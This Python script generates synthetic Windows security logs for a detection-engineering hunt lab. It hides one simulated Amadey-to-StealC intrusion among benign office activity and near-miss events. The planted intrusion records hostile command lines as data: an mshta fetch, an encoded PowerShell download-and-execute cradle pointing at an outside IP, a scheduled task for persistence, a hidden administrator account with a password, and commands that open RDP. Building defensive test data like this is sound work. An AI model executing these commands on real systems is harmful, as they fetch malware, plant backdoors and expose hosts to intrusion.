#!/usr/bin/env python3
"""
gen_dataset.py - build a small, realistic Windows telemetry set to hunt in (Week 5).

Why synthetic: my Elastic SIEM lab collects the right log sources (Security 4688 with
command line, PowerShell 4104, 4698, 4720/4732, 4946, Defender) but has no Amadey activity
in it yet - running Amadey is Week 9 (Atomic Red Team). To build and *prove* a hypothesis-driven
hunt now, this script plants ONE Amadey -> StealC intrusion inside a day of benign office noise,
plus a few near-misses so triage is real. The events use the SAME ECS field names the Elastic
Agent integrations produce, so the ES|QL / EQL / KQL queries in ../queries/ are the real ones I
would run in Kibana.

Output: ../data/dataset.ndjson   (one ECS JSON document per line, sorted by @timestamp)
Deterministic (fixed seed) -> re-running reproduces the exact dataset and the exact hunt numbers.
Standard library only.

SAFETY: this is defensive detection-engineering test data. It contains NO real malware - only
log records (process names, command-line strings, paths) describing Amadey's documented behaviour,
so hunt queries have something to match. All IOC values are public (TLP:CLEAR), already in week-02.
"""
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / "data" / "dataset.ndjson"
SEED = 2026
DAY = datetime(2026, 10, 1, tzinfo=timezone.utc)

HOSTS = {
    "WIN-FIN-07":       "e.carter",     # the infected finance workstation
    "WIN-HR-02":        "m.ivanova",
    "WIN-SALES-05":     "d.kim",
    "WIN-DEV-11":       "a.orlov",
    "WIN-E1HKS3CTHMI":  "lab",          # the box from my real SIEM lab
    "DC01":             "SYSTEM",
}
rng = random.Random(SEED)
events = []


def base(ts, host, user, code, provider, category, action, dataset, type_=None):
    e = {
        "@timestamp": ts.isoformat().replace("+00:00", "Z"),
        "event": {"code": code, "provider": provider, "category": category, "action": action},
        "host": {"name": host, "os": {"family": "windows"}},
        "user": {"name": user},
        "data_stream": {"type": "logs", "dataset": dataset, "namespace": "default"},
    }
    if type_:
        e["event"]["type"] = type_
    return e


def proc(ts, host, user, name, cmd, parent, pid=None, ppid=None, folder=None):
    """Security 4688 process creation, as the System integration maps it."""
    e = base(ts, host, user, "4688", "Microsoft-Windows-Security-Auditing",
             ["process"], "Process Creation", "system.security", ["start"])
    execmap = {
        "powershell.exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "cmd.exe": r"C:\Windows\System32\cmd.exe",
        "wscript.exe": r"C:\Windows\System32\wscript.exe",
        "cscript.exe": r"C:\Windows\System32\cscript.exe",
        "mshta.exe": r"C:\Windows\System32\mshta.exe",
        "rundll32.exe": r"C:\Windows\System32\rundll32.exe",
        "schtasks.exe": r"C:\Windows\System32\schtasks.exe",
        "net.exe": r"C:\Windows\System32\net.exe",
        "net1.exe": r"C:\Windows\System32\net1.exe",
        "netsh.exe": r"C:\Windows\System32\netsh.exe",
        "reg.exe": r"C:\Windows\System32\reg.exe",
        "explorer.exe": r"C:\Windows\explorer.exe",
        "outlook.exe": r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
        "chrome.exe": r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        "winword.exe": r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        "teams.exe": r"C:\Users\%s\AppData\Local\Microsoft\Teams\current\Teams.exe" % user,
        "gpupdate.exe": r"C:\Windows\System32\gpupdate.exe",
        "svchost.exe": r"C:\Windows\System32\svchost.exe",
        "GoogleUpdate.exe": r"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe",
        "MsMpEng.exe": r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18\MsMpEng.exe",
    }
    executable = folder or execmap.get(name, r"C:\Windows\System32\%s" % name)
    e["process"] = {
        "name": name, "executable": executable, "command_line": cmd,
        "pid": pid or rng.randint(1000, 9000),
        "parent": {"name": parent, "executable": execmap.get(parent, r"C:\Windows\explorer.exe"),
                   "pid": ppid or rng.randint(600, 999)},
    }
    events.append(e)
    return e["process"]["pid"]


def psblock(ts, host, user, text, pid):
    """PowerShell 4104 script-block logging (windows.powershell_operational)."""
    e = base(ts, host, user, "4104", "Microsoft-Windows-PowerShell",
             ["process"], "Execute a Remote Command", "windows.powershell_operational")
    e["powershell"] = {"file": {"script_block_text": text}}
    e["process"] = {"pid": pid}
    events.append(e)


def task(ts, host, user, taskname, content):
    """Security 4698 scheduled task created."""
    e = base(ts, host, user, "4698", "Microsoft-Windows-Security-Auditing",
             ["iam", "configuration"], "A scheduled task was created", "system.security")
    e["winlog"] = {"event_data": {"TaskName": taskname, "TaskContent": content, "SubjectUserName": user}}
    events.append(e)


def newuser(ts, host, actor, target):
    e = base(ts, host, actor, "4720", "Microsoft-Windows-Security-Auditing",
             ["iam"], "A user account was created", "system.security", ["user", "creation"])
    e["winlog"] = {"event_data": {"TargetUserName": target, "SubjectUserName": actor}}
    e["user"] = {"name": actor, "target": {"name": target}}
    events.append(e)


def addmember(ts, host, actor, group, member):
    e = base(ts, host, actor, "4732", "Microsoft-Windows-Security-Auditing",
             ["iam"], "A member was added to a security-enabled local group", "system.security", ["group"])
    e["winlog"] = {"event_data": {"TargetUserName": group, "MemberName": member, "SubjectUserName": actor}}
    events.append(e)


def fwrule(ts, host, user, rulename):
    e = base(ts, host, user, "4946", "Microsoft-Windows-Security-Auditing",
             ["configuration"], "A rule was added to the Windows Firewall exception list", "system.security")
    e["winlog"] = {"event_data": {"RuleName": rulename, "SubjectUserName": user}}
    events.append(e)


def t(h, m, s=0):
    return DAY + timedelta(hours=h, minutes=m, seconds=s)


# ---------------------------------------------------------------- benign background noise
BENIGN_PROC = [
    ("explorer.exe", "chrome.exe", r'"C:\Program Files\Google\Chrome\Application\chrome.exe"'),
    ("explorer.exe", "outlook.exe", r'"...\OUTLOOK.EXE" /recycle'),
    ("explorer.exe", "winword.exe", r'"...\WINWORD.EXE" /n'),
    ("explorer.exe", "teams.exe", r'"...\Teams.exe" --process-start-args'),
    ("services.exe", "svchost.exe", r"C:\Windows\System32\svchost.exe -k netsvcs -p"),
    ("svchost.exe", "gpupdate.exe", r"gpupdate.exe /target:computer"),
    ("services.exe", "MsMpEng.exe", r'"MsMpEng.exe"'),
    ("GoogleUpdate.exe", "GoogleUpdate.exe", r'"GoogleUpdate.exe" /ua /installsource scheduler'),
    ("explorer.exe", "powershell.exe", r"powershell.exe -ExecutionPolicy RemoteSigned -File C:\Scripts\Get-DiskReport.ps1"),
    ("cmd.exe", "net.exe", r"net use P: \\fileserver\share /persistent:yes"),
    ("svchost.exe", "rundll32.exe", r'rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL'),
]
BENIGN_PS = [
    "Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version",
    "Import-Module ActiveDirectory; Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\\Reports\\users.csv",
    "$ProgressPreference='SilentlyContinue'; Get-Service | Where-Object Status -eq 'Running'",
    "Update-Help -Module Microsoft.PowerShell.* -ErrorAction SilentlyContinue",
    "Get-WinEvent -LogName Security -MaxEvents 100 | Where-Object Id -eq 4624",
    "Invoke-WebRequest -Uri http://10.10.0.5/artifacts/report-template.docx -OutFile C:\\Temp\\t.docx",  # internal, benign
]
BENIGN_TASKS = [
    (r"\GoogleUpdateTaskMachineCore", "<Triggers><CalendarTrigger><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers><Exec><Command>C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe</Command></Exec>"),
    (r"\Microsoft\Office\Office Automatic Updates 2.0", "<Triggers><TimeTrigger><Repetition><Interval>PT1H</Interval></Repetition></TimeTrigger></Triggers><Exec><Command>C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\OfficeC2RClient.exe</Command></Exec>"),
    (r"\Microsoft\Windows\UpdateOrchestrator\Reboot", "<Triggers><TimeTrigger /></Triggers><Exec><Command>C:\\Windows\\System32\\usoclient.exe</Command></Exec>"),
]

BIZ_USERS = {h: u for h, u in HOSTS.items() if h not in ("DC01",)}
for i in range(820):
    host = rng.choice([h for h in HOSTS if h != "DC01"])
    user = HOSTS[host]
    ts = t(rng.randint(8, 17), rng.randint(0, 59), rng.randint(0, 59))
    parent, name, cmd = rng.choice(BENIGN_PROC)
    if name == "powershell.exe":
        pid = proc(ts, host, user, name, cmd, parent)
        if rng.random() < 0.7:
            psblock(ts + timedelta(seconds=1), host, user, rng.choice(BENIGN_PS), pid)
    else:
        proc(ts, host, user, name, cmd, parent)
# a few standalone benign script blocks
for i in range(60):
    host = rng.choice([h for h in HOSTS if h != "DC01"])
    psblock(t(rng.randint(8, 17), rng.randint(0, 59), rng.randint(0, 59)), host, HOSTS[host], rng.choice(BENIGN_PS), rng.randint(1000, 9000))
# benign scheduled tasks
for i in range(14):
    host = rng.choice([h for h in HOSTS if h != "DC01"])
    tn, tc = rng.choice(BENIGN_TASKS)
    task(t(rng.randint(8, 17), rng.randint(0, 59)), host, HOSTS[host], tn, tc)

# ---------------------------------------------------------------- near-misses (force real triage)
# NM1: legit helpdesk creates a normal account and adds it to Remote Desktop Users (NOT Administrators)
newuser(t(9, 40, 5), "WIN-DEV-11", "a.orlov", "jdoe")
addmember(t(9, 40, 30), "WIN-DEV-11", "a.orlov", "Remote Desktop Users", "jdoe")
# NM2: installer adds a firewall rule (no account change near it)
fwrule(t(14, 3, 0), "WIN-SALES-05", "d.kim", "Zoom Video Call (TCP-In)")
# NM3: a benign internal download cradle via PowerShell started from explorer (not a script host)
p = proc(t(10, 12, 0), "WIN-DEV-11", "a.orlov", "powershell.exe",
         r"powershell.exe -Command Invoke-WebRequest http://10.10.0.5/artifacts/build.zip -OutFile C:\Temp\build.zip", "explorer.exe")
psblock(t(10, 12, 1), "WIN-DEV-11", "a.orlov", "Invoke-WebRequest http://10.10.0.5/artifacts/build.zip -OutFile C:\\Temp\\build.zip", p)

# ---------------------------------------------------------------- the planted Amadey -> StealC intrusion
HOST, U = "WIN-FIN-07", "e.carter"
TMP = r"C:\Users\e.carter\AppData\Local\Temp"
p_out = 7120
proc(t(11, 14, 2), HOST, U, "wscript.exe", r'"C:\Windows\System32\wscript.exe" "C:\Users\e.carter\Downloads\invoice_2025.js"', "outlook.exe", pid=5810, ppid=p_out)
proc(t(11, 14, 5), HOST, U, "mshta.exe", r"mshta.exe http://pivqmane.com/doc/fb.mp4", "wscript.exe", pid=6042, ppid=5810)
ps_pid = proc(t(11, 14, 9), HOST, U, "powershell.exe",
              r"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
              "mshta.exe", pid=6460, ppid=6042)
psblock(t(11, 14, 10), HOST, U,
        "IEX (New-Object Net.WebClient).DownloadString('http://185.215.113.16/test/amnew.exe'); "
        "$b=[System.Convert]::FromBase64String($e); [System.Reflection.Assembly]::Load($b).EntryPoint.Invoke($null,$null)",
        ps_pid)
proc(t(11, 14, 40), HOST, U, "amnew.exe", r"amnew.exe", "powershell.exe", pid=6980, ppid=ps_pid, folder=TMP + r"\amnew.exe")
proc(t(11, 15, 2), HOST, U, "Yfgfwb.exe", r'"C:\Users\e.carter\AppData\Local\Temp\067640a009\Yfgfwb.exe"', "amnew.exe",
     pid=7004, ppid=6980, folder=TMP + r"\067640a009\Yfgfwb.exe")
proc(t(11, 15, 5), HOST, U, "schtasks.exe",
     r'schtasks.exe /Create /SC MINUTE /MO 1 /TN Yfgfwb /TR "C:\Users\e.carter\AppData\Local\Temp\067640a009\Yfgfwb.exe" /F',
     "Yfgfwb.exe", pid=7110, ppid=7004)
task(t(11, 15, 6), HOST, U, r"\Yfgfwb",
     "<Triggers><TimeTrigger><Repetition><Interval>PT1M</Interval></Repetition></TimeTrigger></Triggers>"
     "<Exec><Command>C:\\Users\\e.carter\\AppData\\Local\\Temp\\067640a009\\Yfgfwb.exe</Command></Exec>")
proc(t(11, 15, 40), HOST, U, "rundll32.exe",
     r'rundll32.exe "C:\Users\e.carter\AppData\Roaming\f936986d553273\clip64.dll",Main', "Yfgfwb.exe",
     pid=7260, ppid=7004, folder=r"C:\Windows\System32\rundll32.exe")
proc(t(11, 17, 10), HOST, U, "powershell.exe",
     r"powershell.exe -Command Expand-Archive -Path $env:TEMP\10000340261\protected.zip -DestinationPath $env:TEMP\10000340261\protected",
     "Yfgfwb.exe", pid=7420, ppid=7004)
proc(t(11, 17, 40), HOST, U, "x64_protect.exe", r"x64_protect.exe", "powershell.exe", pid=7480, ppid=7420, folder=TMP + r"\10000340261\protected\x64_protect.exe")
# v5 RAT: hidden admin + firewall rule for RDP
proc(t(11, 19, 30), HOST, U, "cmd.exe", r'cmd.exe /c net user sysupd$ Aa123456! /add', "Yfgfwb.exe", pid=7600, ppid=7004)
proc(t(11, 19, 31), HOST, U, "net.exe", r"net user sysupd$ Aa123456! /add", "cmd.exe", pid=7602, ppid=7600)
newuser(t(11, 19, 32), HOST, U, "sysupd$")
proc(t(11, 19, 33), HOST, U, "net.exe", r"net localgroup administrators sysupd$ /add", "cmd.exe", pid=7610, ppid=7600)
addmember(t(11, 19, 34), HOST, U, "Administrators", "sysupd$")
proc(t(11, 20, 8), HOST, U, "netsh.exe",
     r'netsh.exe advfirewall firewall add rule name="Remote Desktop (TCP-In) svc" dir=in action=allow protocol=TCP localport=3389',
     "Yfgfwb.exe", pid=7700, ppid=7004)
fwrule(t(11, 20, 10), HOST, U, "Remote Desktop (TCP-In) svc")
proc(t(11, 20, 12), HOST, U, "reg.exe",
     r"reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f",
     "Yfgfwb.exe", pid=7710, ppid=7004)

# ---------------------------------------------------------------- write
events.sort(key=lambda e: e["@timestamp"])
OUT.parent.mkdir(parents=True, exist_ok=True)
with OUT.open("w", encoding="utf-8") as f:
    for e in events:
        f.write(json.dumps(e, ensure_ascii=False) + "\n")

from collections import Counter
c = Counter(e["event"]["code"] for e in events)
hosts = Counter(e["host"]["name"] for e in events)
print(f"{len(events)} events -> {OUT}")
print("by event.code:", dict(sorted(c.items())))
print("by host:", dict(hosts))
print("window:", events[0]["@timestamp"], "->", events[-1]["@timestamp"])
